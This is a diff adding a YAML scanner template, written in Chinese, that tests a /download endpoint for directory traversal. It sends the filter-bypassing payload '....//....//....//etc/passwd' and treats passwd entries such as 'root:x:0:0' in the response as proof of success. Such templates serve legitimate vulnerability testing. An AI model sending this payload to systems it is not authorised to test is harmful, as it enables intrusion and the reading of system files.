@@ -1,0 +1,24 @@
+name: 目录遍历高级测试
+description: 测试高级目录遍历漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /download
+  params:
+    file: "....//....//....//etc/passwd"
+    type: "log"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "root:x:0:0"
+    - "daemon:x:1:1"
+    - "bin:x:2:2"
+  errorIndicators:
+    - "file not found"
+    - "access denied"
+    - "文件不存在"
+  statusCode: 200
